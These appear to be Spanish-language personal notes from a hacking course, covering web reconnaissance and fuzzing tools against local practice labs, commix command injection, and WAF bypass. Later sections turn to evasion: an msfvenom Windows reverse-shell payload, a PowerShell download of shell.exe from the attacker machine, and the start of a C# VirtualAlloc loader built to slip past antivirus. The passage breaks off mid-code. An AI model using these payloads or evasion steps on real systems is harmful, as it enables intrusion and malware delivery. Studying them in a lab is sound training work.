para sus opciones de uso que serian lo recomendable estudiar a fondo para saber que uso le podemos dar a dcha herramienta.

por ejemplo -p

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sublist3r -d pagina -v -p 80,443 le decimos que son puertos abiertos , esto pasara de pasivo a actvo y buscara en cada subdominio estos puertos, tenerlo en cuenta
esto nos dara los subdominios con dichos puertos abiertos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ya en este caso lo mas recomendable seria nmap, analizar dominio su ip, mas el puerto con tecnicas desapercibidas.


Bien, en el video 77, veremos como utilizar una herramienta para el analisis y vulnerabilidades y lenguajes de programacion para los input
en esta ocacion la herramienta llamada whatweb en el respositorio de github, esta herramienta es un escaner de aplcaciones web.

Ya saben whatweb -h para informaicon,esta herramienta viene por defecto en kali

para ello

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whatweb -v http://192.168.0.7:8080 en mi caso es la ip de mi maquna VPLE y el puerto para la pagina bwapp, que es la pagina que mas usaremos en el transcurso
de esta seccion para el analisis de subdominios
en mi caso utilizare a multillidae 1336
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


ver los plugins

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whatweb -l, lo dejamos por defecto, ya que la herramienta no es tan intrusiva, lo podemos ver usando wireshark
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Este analisis nos lanza en que lenguaje esta realizado y su version, que maquna lo lanza es decir su sistema operativo y version
nos indica una redireccion y su version que la podemos explotar como una vurnerabilidad y secciones de cookies que podemos envenenar y susplantar al usuario

Otra herramienta parecida es webanalyze, esta si se debe de instalar en kali

para ello instalamos go, lenguaje que se desarrollo, luego

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
go get + repositorio
Lo que me funciono 

# Descargar Go
wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz

# Extraer el archivo tarball
sudo tar -C /usr/local -xzf go1.20.5.linux-amd64.tar.gz

# Configurar el PATH en ~/.zshrc
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.zshrc
source ~/.zshrc

# Verificar la instalación de Go
go version

# Instalar webanalyze
go install github.com/rverton/webanalyze@latest

# Asegurarte de que $HOME/go/bin esté en tu PATH
echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.zshrc
source ~/.zshrc

# Verificar la instalación de webanalyze
webanalyze -h

# Usar webanalyze para analizar un sitio web
webanalyze -host https://example.com

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Una vez instalada

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
webanalyze -host + direccion, puede ser la anterior de multillidae
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora en el video 78 empezaremos a auditar lo que seria una pagina web y sus sbdominios

Utilizaremos para este tipo de analisis la herramienta que viene por defecto, dirbuster
esta herramienta probara todos los campos, opciones de la pagina, es decir, www.pagina/usuario
www.pagina/blog , /info entre otras, sera intrusiva porque tiene un listado que realiza este funcion, se encuentras en cd ~/dibuster
o usr/share/wordlists/dirbuster, yo lo hago directamente, pues bien esta herramienta usara estos diccionarios que estan en la ubicacion señalada
los usaran secesivamente 

Entonces seria

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dirbuster 'u y el link de la pagina en este caso la de mutillidae
'u para indicar la url
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


la direccion larga es donde buscaran los diccionarios cuando ingresen el comando anterior, les aparecera una ventana para empezar con el analisis,
esto buscara todas -/- de la paina sucesivamente como lo indique anteriormente.

Esto seria todo de la herramienta, y que al final esta nos puede entregar un reporte de lo obtenido, detuve el analisis para continuar.


Bien volvemos, ahora con la herramienta gobuster, la podemos encontrar en github

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo apt install gobuster
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

otra herramienta que va de la mano con la anterior es Seclists, esta herramienta ofrece diccionarios para la explotacion de vulnerabilidad que realizaremos 
con la herramienta gobuster, tambien la encontramos en github

Igual que lo anterior 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo apt install seclists
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

recordar siempre el sudo apt update para verificar que esta actualizado los repositorios

este ultimo estara con los diccionarios de todo tipo en la siguiente ubicacion: cd /usr/share/seclists

Para lanzarlo de la siguiente forma

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gobuster dir -u http://ip de la maquina VPLE + el puerto en mi caso 8899 de la pagina ninja  -w /usr/share/secists/Discovery/Web-Content/y cualquier diccionario de tu gusto -x pdf
dir es directorio
-u para links
-w para los diccionarios
-x pdf me buscara en el dominio archivos unicamente en formato pdf,
mas informacion en gobuster -h y gobuster dir -h o cualquier opcion para otra informacion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Queda asi

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gobuster dir -u http://192.168.0.7:8899 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Lo que acabamos de presenciar es una explotacion a los subdominios, nos muestra los enlaces que podemos indagar en busca de alguna credencial o mas



Video 80, en esta ocacion veremos la herramienta zap proxy, de la empresa de seguridad OWASP

Es una herramienta para vulnerablidades de aplicaciones web


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo apt install zaproxy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Y listo solo abrimos la herramienta zap, al iniciar nos preguntara si deseamos guardar seccion en mi caso elegi no, pueden elegir cualquiera.

Empezaremos con el escaneo automatico, nos pedira el url que sera en este caso la url de la maquina victima vple + puerto en este caso 1336
que es la pagina multillidae, pueden utilizar cualquiera que presenta el pdf luego de ingresar en mi caso 192.168.0:1336 pesiono el boton attack y analizara la 
aplicacion, esto funciona tambien en las empresas como herramienta para evualuar la aplicacion antes de sacarla al mercado, no solamente para ciberseguridad.

Aqui veremos todos los enlaces que nos mostrara y en el apartaro de alert nos mostrara vulnerabilidades y sus soluciones , ademas si desglosamos
encontraremos spider de las tablas encontrados en la url, como en la herramienta anterior que pudimos encontrar archivos pdf y mas.

Ahora pasaremos al analisis manual, es lo mismo pero con otras herramientas como lo es HUD

Con el hud activo y la url y puerto igualn nos abrira la pagina mas una framwor , dentro de la pagina creare una cuenta y a la izquierda estaran las alertas
de la pagina actual, del lado derecho las alertas en general de la pagina.

Del lado derecho la opcion active scan para aplicar lo que seria un payload para explotar un inyection sql si esta aplicaria y a la vez realiza un escaneo activo

En la parte izquierda Scope, es para entrar o sacar la pagina donde nos encontremos del analisis anteriormente mencioando

En la parte izquierda la que tiene icono de radar “break” es para interceptar como en el programa de Burpsuite del curso pasado de ciberseguridad completo

En la parte izquierda con icono de bombilla es para editar los campos que los desarrolladores tienen por defecto desactivados, los podemos editar y luego enviar
cualquier campo bloqueado, algo que tambien podemos hacer con el anterior solamente interceptando en flight

Cualquier otra informacion mas detallada al comenzar con el analisis manual con el hud activado muestra un tutorial.

Otro a la derecha o mejor dicho 2, start spider para buscar en toos los analisis formato html y ajaz spider para formatos java script
abre otro navegador y realiza spider

Otro muy interesante otro de la derecha mode scan que analiza cada pagina o subdominio de una aplicacion que naveguemos, al contrario de la anterior que seria todo , esta seria solo la que visitaramos.

Sencillo , los aqtaques de inyection se muestran , el interceptor en este caso ingreso santiago 1234 y lo cambio por pedro 4321 y se envia de la ultima forma

Esto es muy intrusivo nousar en pagina de empresas o personas con la cual no se tegna un contrato

Ahora en el video 81 veremos dos herramientas que serian alternativas a la anterior que acabamos de ver; Nikto y Skipfish


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Para usar nikto
nikto -host ip de la direccion de la pagina -o report.html -Format html
-host para los enlaces
-o para exportar el analisis
-Format para que entregue el analisis en el formato que indiquemos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Bien, ahora pasaeremos a la herramienta Skipfish


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
skipfish -o report http://192.168.0.7:1336

Lo mismo que la herramienta anterior, -o para exportarlo en un fichero
y luego la url a analizar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Los dos se abren igual, firefox y reporte o en el caso de skipfish firefox reporte/index.html

video 82, veremos lo que es nuclei en su repositorio de github

Es una herramaienta de analisis de app como las paginas web y mas, se puede usar como defensiva tal como defensiva tambien

Se basa en nuclei templates, o plantillas, que se basan por ejemplo una plantilla cve 2022, utilizara esa plantilla con lenguaje yaml que es 
descriptivo y utilizara esta plantilla como base para su analisis, en este ejemplo utilizan el metodo GET y le aplican un path

Tambien varias informaciones de como crear nuestras propias plantillas para aquellos que esten mas familiarizado con el area defensiva

Bien, para instalarlo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
luego
nuclei --update-templates
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

y listo

En mi caso debi de actualizar go

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Primero descarga la ultima version en la pagina oficial de go, se puede encontrar en go github con las intrucciones
luego borrar todo rastro de go antiguo con sudo rm -rf /usr/local/go
luego en la carpeta donde se descargo la ultima version tar -C /usr/local -xzf archivo descargado
y por ultimo dentro de la ubicacion sur/local/go export PATH=$PATH:/usr/local/go/bin
y al final comprobar con go version
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Lo anterior termino como lo indica pero aun asi nuclei no aparecia instalado, en mas formas de instalacion elijan la opcion github que
en mi caso fue la que me funciono

Bien para usarla seria de la siguiente forma, recordad que podeis usar nucli -h para que estudien a profundidad mas el tema

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nuclei -u http://192.168.0.7:1336 -ni

-u para la url de la app web
-ni para realizar el analisis en una app web sin conexion a internet
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tambien la podemos usar en contra de la maquina, solo la ip sin puertos de web como 1336 y en su caso el puerto comun el 80
mas la plantilla de seleccion

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nuclei -u 192.168.0.7:80 -ni

con plantilla en este caso seria
nuclei -u http://192.168.0.7:1336 -ni -t exposures
-t para las plantillas
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Si lo anterior no te funciono , solo usa sudo apt install nuclei y luego installa con nuclei -update-templates

Video 84 fuzzing basico con ffuf

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ffuf -h o wfuzz -h

ffuf -u +url en este caso la que tenemos de la maquina virtual
vple , usaremos en este ejmeplo + apartado por ejemplo FUZZ que sera 
reemplazada por la palabra que le coloquemos en el diccionario
+ -w diccionario direccion de este por ejemplo  samll.txt

Debe de quedar como el sguiente ejemplo

ffuf -u http://192.168.0.7:1336/FFUZ -w /usr/share/seclists/
Discovery/web-Content/directory-list-lowercase-2.3-small.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Aquí está el desglose del comando:
1. ffuf: Es el nombre de la herramienta.

2. -u http://192.168.0.7:1336/FFUZ: Aquí se especifica la URL objetivo. La parte FFUZ es un marcador de posición que ffuf reemplazará con las entradas de la lista de palabras (wordlist).

3. -w /usr/share/seclists/Discovery/web-Content/directory-list-lowercase-2.3-small.txt: Aquí se especifica la wordlist (lista de palabras) que se utilizará para la fuerza bruta. Esta lista contiene nombres de archivos y directorios comunes en minúsculas que ffuf probará contra la URL objetivo.


¿Qué hace este comando?
• ffuf enviará peticiones HTTP al servidor en http://192.168.0.7:1336/, reemplazando FFUZ en la URL con cada una de las entradas en la wordlist especificada.
• Por ejemplo, si la wordlist contiene las palabras "admin", "login", y "config", ffuf intentará acceder a http://192.168.0.7:1336/admin, http://192.168.0.7:1336/login, y http://192.168.0.7:1336/config.
• El objetivo es descubrir qué archivos o directorios existen en el servidor web.


Resultado esperado
◇ La herramienta mostrará qué URLs dieron una respuesta válida del servidor, lo que indica que esos archivos o directorios existen.

Esta es una técnica común en pruebas de penetración para descubrir recursos ocultos o no documentados en un servidor web.

Otra cosa para probar es utilizando la herramienta anterior con burpsuite, en mi caso le configure un proxi con la direccion 127.0.0.1 puerto 4444
y que reciba hhtp, haremos el mismo comando anterior pero anadiendo -x

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ffuf -u http://192.168.0.7:1336/FFUZ -w /usr/share/seclists/Discovery/web-Content/directory-list-lowercase-2.3-small.txt -x http//127.0.0.1:4444
y con esto burpsuite interceptara todoas las palabras utilizaras, sombren la palabra luego de GET y luego presionar foward y veran lo mismo que en el analisis en kali
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otra cosa muy importante, quizas se abran de preguntar y si en vez de FUZZ coloco admin/console para no estar colocando el comando uno por uno,
pues hay una forma y hara una busqueda en todos los dominios de la pag que enlazamos solamente con -recursion


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ffuf -u http://192.168.0.7:1336/FFUZ -w /usr/share/seclists/Discovery/web-Content/directory-list-lowercase-2.3-small.txt -x http//127.0.0.1:4444 -recursion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Este modo, es decir, -recursion hara que las palabras del diccionario al ser utilizadas en cada dominio para encontrar parecido y arrojarnos la informacion conjuta a esta
si interceptamos en burpsuite veran que con este modo si nos arroja, por ejemplo image que esta en el diccionario y abarco todos los dominios en busca de un apartado con 
este nombre ya me arroja en Burpsuite Get /image/goals , tambien /grafica, entre otros.

Pueden investigar mas modos, como -e para las extensiones como los es .png y mas.

En el repositorio dejare algunos que me he de encontrar mientras realizo pruebas que es lo que os recomiendo con cada unas de las opciones.

Para probar el trabajo solo pegar el link sin el FUZZ en el navegador como este ejemplo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://192.168.0.7:8899/js
puede ser blogg.png entre otros

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Video 84
Bien ahora realizaremos con ffuf que abriremos varios diccionarios a la vez.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ffuf -u http://192.168.0.7:1336/W1/W2 -w /usr/share/seclists/Discovery/Web-Content/
directory-list-lowercase-2.3-small.txt:W1 -w /usr/share/seclists/Discovery/Web-Content/
directory-list-2.3-small.txt:W2 -x http://127.0.0.1:4444


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Cuando lo interceptemos con burpsuite veremos que tendremos dos palabras de los dos diccionarios ubicados en el GET


Ahora lo haremos de una manera diferente para escanear la pagina con los parametros que le 
indiquemos en los diccionarios.

Esta vez utilizare una nueva opcion de burpsuite, cuando nos dirijamos a proxi, abriremos
la opcion de open browser para interceptar las peticiones del navegador

En esta ocacion utilizare el dominio DVWA en la 1335 en mi maquina linux para interceptarla en
burpsuite, luego de haber entrado y ser interceptados, luego de haberlo hecho iniciamos seccion
cuando seamos interceptados por burpsuite se presentara un apartado POST un click en el
click derecho fuera y seleccionamos copy to file, en mi caso le nombrare como reuieste_post
en mi escritorio.

Luego pasamos al terminal de kali y abrimos el archivo con emacs, lo que haremos es fusear
en este caso el nombre de usuario sera reemplazado por FUZZ, guardamos y luego

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ffuf -request request_post -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 

O mejor aun 

ffuf -request request_post -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x hhtp://127.0.0.1:4444

Y hara lo mismo que vimos anterormente, en el campo nombre donde reemplazamos el nombre
de usuario por FUZZ utilizara cada palabra de nuestro diccionario, esto lo podemos hacer de igual forma
con la contraÑa, de forma simltanea, practicar esto con mas paginas de ejemplos del pdf VLPE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Bien ahora utilizaremos la herramienta radamsa, esta lo que nos ayudara a romper los candados por decirlo de una forma, utilizara nuestro diccionario o por ejemplo un
“hola” y lo va a empezar a mutar.

Lo vamos a fusionar con fuzzer para fussear aplicaciones web.

Nos ponemos en modo nat e instalamos la aplicacion desde gitlab.com, no esta en github en estos momentos.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 $ sudo apt-get install gcc make git wget
 
y luego

git clone https://gitlab.com/akihe/radamsa.git && cd radamsa && make && sudo make install

y ya podriamos volver a host online
e ir al apartado de bin que es donde se encuentra
~/radamsa/bin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


con tan solo escribir

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo “hola” | radamsa escribira todas las posibilidades de hola mas caracteres nuevos tratando de destruir la app web

Practicamente un ataque DDos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Se puede usar para encontrar fallos en las aplicaciones no solo en la web.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Otra forma
echo “hola” > texto.txt

radamsa texto.txxt y realizaria la misma funcion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora veremos como fucionarlo con ffuf

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ffuf -request ~/request_post --input-cmd 'radamsa texto.txt' -x http://127.0.0.1:8080

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Por default lanza 100 peticiones para que sean mas por ejemplo 1000 se le anade -input-num 1000

en mi caso

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└─$ ffuf -request /home/kali/Desktop/request_post --input-cmd 'radamsa texto.txt' -x http://127.0.0.1:8080 -input-num 30
Debi de colocar la direccion de request_post ya que no me funciono con ~/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora intentaremos fusserar el user-agent del request_repost


Video 85

Explotacion de injection de comandos, con la herramienta Commix, este video o seccion se tratara de la explotacion con commix
Por ejemplo cuando realizamos la auditoria y solo encontramos algunos fallos o pocas vulnerabilidades, herramientas como estas
nos podran ayudar.


La instalamos tal cual como sabemos, luego volver a local host.

Utilizare como ejemplo la pagina de nuestra pagina victima 1335 “DVWA” en el apartado command injection, recordando que la credencial es admin-password

Si no les aparece el apartado precionan debajo que indica crear base date, es el unico boton al final

Luego de eso les aparecera a la izquierda las vulnerabilidades, las cuales tambien usando Fuzz podriamos encontrar mas apartados

Bien tomamos la url y en el terminal commix -u mas link

Esto nos analizara , es un escaneo basico.

Si colocamos en la pagina vlnerable el ping de la maquina victima
'
Solo para probar no es muy importante

Ahora el analisis anterior se vera asi 


En este caso no se encontro parametros fuera de lugar, nada de importancia.

Para que se vaya un poco mas alla le agregamos al comando anterior --level 3



Ya cocon esto se le aplica una injection mas brusca

En este caso se le injecta al user para ver si tiene alguna vulnerabilidad que explotar.

Ahora pasamos a interceptar con burpsuite, creamos un proxy 4444 y le colocamos al comando 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
--proxy http://192.168.0.7:4444 -
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Lo siguiente para usar la herramienta commix para que utilice la informacion interceptara en burpsuite e injecte sql en la pagina


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└─$ commix -u http://192.168.0.7:1335/vulnerabilities/exec/ --cookie="Cookie: PHPSESSID=m519nr3elagass5dl1k2ia1go1; security=low" --proxy http://127.0.0.1:4444 --data "ip=127.0.0.1&Submit=Submit"

 la cookie cuando ingreso a la pagina exactamente la cookie del apartado injection sql de la pagina

--data =al campo de injectio donde coloque la ip victima en el campo del apartado injection sql, burpsuite capto ese datp


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

En este caso encontrario en el escaneo en el apartado info una vulnerabilidad una injection y consiguiente preguntaria para abrir un terminal
virtual el cual seria dentro de la maquina victima y podemos usar por ejemplo “ls”


Video 87

Estas herramientas nos serviria para auditorias

changeme, Gitleaks y CyberChef

Toda la informacion de las herramientas estan en archivos .docx con sus nombres

La primera herramienta como se indico para buscar credenciales, la segunda para buscar lo mismo pero en repositorios git y la tercera una mas instuitiva que se utiliza para codificar, descodificar, comprimir , descomprimir y mas.

usando la segunda herramienta se descargo el repositorio de miltillidae

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://github.com/webpwnized/mutillidae.git

git clone + link
para lo que no lo han hecho anteriormente
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


dentro de la carpeta mutillidae ingresamos ls -la
y veremos todo lo que ha tenido o a hecho incluyendo un apartado .git en el cual usaremos la segunda herramienta

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gitleaks detect -v 
dentro de la carpeta mutillidae 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


recordando que -l enlisata los archivos
-ls lista en contenido de un directorio
-a muestra los archivos ocultos como los son los que comienzan con “.”



Por ultimo cyberchef



Me codificara en el formato que le indique el texto de al lado

Hacer una pausa hasta aqui, comenzar con bwapp, multillidae para la injectio sql, recuerden que no es terminar el curso sino aprender
en mi caso me trajo problemas bWAPP lo cual lo pude hacer a traves de docker
docker pull raesene/bwapp en el buscador bwapp docker con docker previamente instalado e iniciado con el estatus verificado que este
corriendo.

Parar aqui y continuar practicando.


docker run -d -p 80:80 raesene/bwapp
luego colocar en el navegador 127.0.0.1-install.php y luego de precionar here 127.0.0.1-login.php

credenciales : users bee and password bug

Ahora ya empezando con el video 88 empezaremos a ver el curso mas realistaya que evadiremos firmware , edr, antivirus etc,
aunque hasta ahora no hemos hecho como muchos cursos que dicen que hackean pero a la hora de atacar deben de apagar los sistemas de
seguridad, pero ahora desactivaremos pero todos los posibles detecciones para que nuestro malware pase desapercibido.

Serian por tres analisis
-el cambio de firma de bits
-el cambio de patrones de malware
-y las dos anteriores combinadas, en el video podran ver el nombre de cada analisis.

Video 90

Ahora veremos una herramienta para deteccion llamada balanceador.

load balancing detecter_halberd


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lbd 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto es para identificar si la pagina tiene algun balanceador destras con servidores, no solo escanear la pagina sino identificar el servidor detras de esta.

Seria bueno probarlo con nuestra maquina victima exactamente la ip OWASP Juice Shop.





En este caso cuando entren la misma pagina les dara in link o pueden copiar la ip que como saben es el identificador de la pagina que usamos

En esta pagina no posee balanceo, les recuerdo o pueden leer repositorios al respecto son cuando grandes empresas o app webs tienen mucho trafico de 
usuario, estos utilizan otros servidores para liberar carga y la pagina no caega.


Al contrario de este ejemplo de una que si tiene balanceo , donde apunta dos ip que funcionan como apoyo a la pagina


Y un balanceo de carga.

Luego de esto quizas esas direcciones ip no sean servidores reales sino pantallas, para eso utilizaremos la herramienta mencioanada anteriormente
halberd

Luego de instalarla siempre recordando ir al repositorio de esta investigar de que se trata para empaparse un poco de que va esta herramienta.

Lo de siempre, sopiar codigo git clone luego entrar a la carpeta y con sudo python2 setup.py install ya deberian de tener la herramienta halberd

esta misma herraminenta igual que la anterior , healberd mas el dominio

o en nuestro caso owasp



Video 91

En este apartado se hablara sobre una herramienta muy utilizara en auditoridas “WAF”

Son herramienta que una vez hayamos visto que una pagina tiene balanceador recordar que esto ultimo no nos limita, podemos utilizar un payload sql inyection y que quizas el servidor mas el balanceador limites mostrar todo de la app web pero ahi es donde entra la herramienta waf quien nos analizara y depurada en busca de amenazas y en este apartado veremos como evadirla.


Y la herramienta que utilizaremos para la evasion en wafw00f

esta herramienta viene por defecto en kali

y es como la anterior 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wafw00f mas el dominio, en mi caso utilice 8899 lab de ninja.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Pero en mi caso no muestra ya que no tiene waf, en tal caso lo pueden probar con udemy
wafw00f https://www.udemy.com/es/ y listo

En este caso tampoco ya que es normal que pagina como udemy esten protegidas, en tal caso si no
os mosttraria el tipo de configuracion del balance y el tipo de waf que utiliza que seria necesario paa su explotacion

Video 92

Recordar que antes de atacar directamente o mas bien evadir WAF primero seria mas recomendable buscar otros subdominios que no tengas balanceadores que por ende no tengan WAF, esto seria antes de empezar por el WAF directamente.

Herramienta para la evacion : bypass firewall by dns history

Esta herramienta lo que realizara es buscar la ip del nombre del dominio que le pasemos.

Recordando que si tiene WAF este trabajara de la siguiente forma

El usuario entra a la ip del waf el waf loverifica y filtra los http al servidor real

Buscamos la herramienta en el repositorio los pasamos a nuestro terminal y luego de extraerlo le daremos permiso con chmod 777 al archivo bypass, siempre funciona en su mayoria con un sudo.

Mas sudo apt install jq, que es un requerimiento.

Luego de esto seria


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
./bypass.....sh -d dominio
en dominio coloco por ejemplo google.com

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Esto nos ayudaria ya que algunos subdominio no estan protegido pero algunos de ellos apuntan al servidor web de origen,esta seria unas de las formas de evadir.

Otra forma seria.

Ver las opciones en la pagina waf-bypass.com

Lo mas importante para esto hay que estar al dia, cada waf se arregla en semanas , por eso estar atento con lo utlimo

Otra es de github waf-bypass (nemesida)

es una herramienta que lanza payloads a los waf para verificar cual hace efecto, esta herramienta es muy intrusiva , tenerlo en cuenta.

Este seria descargar el repositorio, pasarlos con python bypass.py y para ejecutarlo seria como lo indica en el repositorio que seria casi igual que el anterior.

video 94

Evasion de defensas

Seria abrir nuestras maquinas de servidor ws01 y ws02, unas de las maquinas la usaremos normal ya que seria una maquina de donde atacaremos y la otra la dejaremos bajo el dominio del servidor para atacarla para simular que es el empleado de una empresa.

Usaremos un exploit facil de detectar usando msfconsole

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
use exploit/multi/handler
show payloads ---para ver todos los payloads que soporta
como atacaremos a un sistema windows busquen el mas basico para empezar la prueba
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ya saben algo reversable para luego usar metasploit

Recordar que estas evasiones no son unicamente para sistemas operativos, lo podemos usar para cualquier app u otros sistemas.

En mi caso tome uno basico como lo mencione que lo hicieran ya que emprezaremos con una prueba, en mi caso tome




sin meterpreter, basico

y lo seleccionamos con set payload + el nombre
seria set payload windows/shell/reverse_tcp

abrimos otra ventana en el terminalcon ctrl + shift + t e ingresamos


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfvenom --platform windows --arch x64 -p windows/shell/reverse_tcp lhost=ip de kali lport=cualquier puerto en mi caso 5555 -f exe > shell.exe
-f formato
> seria la salida el nombre del archivo mas la extension o formato que le indicamos

msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f exe -o payload.exe
Asi puede quedar como ejemplo esrte de arriba
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

En mi caso me dice que arch es incompatible con el payload si pasa lo mismo solo elminar la parte de --arch y listo, le debe de generar el payload

Ahora pasaremos el archivo a la maquina que tomamos como atacante , la maquina windows la que eligieron del servidor de server.

en kali seria 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python2 -m SimpleHTTPServer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

y en la maquina windows el mismo comando que usamos para pasar a mimikatz


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 (New-Object System.NET.WebClient).DownloadFile('http://ip kali:8000/shell.exe', “shell.exe”)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Recordandoque deben de apagar la proteccion en tiempo real en su maquina atacante de windows ya que la que atacaremos seria la otra maquina del servidor con las defensas que deben de estar arriba

Luego de pasar el archivo ingresamos show options en kali para editar el payload, ya saben como hacerlo, colocar la ip de kali en lhost
+ lport en el repositorio del curso completo de ciberseguridad

ejecutamos con exploit y ejecutamos nuestro archivo shell de la maquina empleado que hayan elegido como atacante para visualizar como este se ejecuta y funciona, ya dentro de la maquina lo podemos comprobar verificando que estamos dentro de la maquina, si desean pueden practicar subiendo de escalas a permisos de administrador.

Ahora pasaremos a la prueba real, donde pasaremos el archivo shell a la maquina donde estan todas las seguridad activadas.

Cuando lo pasen pasaran dos cosas, el antiirus bloqueara su uso, es decir, no dejara ejecutarlo o lo borrara de forma instantanea, como ya sabemsos utilizamos un payload basico esto estaba previsto.

Trabajaremos de la mano con c# para crear nuestro propio binario a la maqina victima, en mi caso empleado1 y empleado2 sera quien tambien ataque en conjunto a kali.

Para aquello abriremos la maquina de windows  atacante que ya tenemos visual studio en el curso anterior.esto funciona de la siguiente forma , crearemos un payload desde la raiz con nuestra firma en en lengaje para qe el antivirus no lo reconozca, algo que no haya detectado. haciendo llamadas a la apy de windows que es win32.


Creamos un nuevo proyecto, elegimos lenguaje c#, palataforma windows y consola en las pestanas de arriba y nos quedamos con .net

Luego los codigos que apareznacan lo borran dejamos la pantalla vacia, y continuamos con nuestro proceso.

Nuestras librerias

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nuestro codigo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
namespace WIn32

 {

    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]

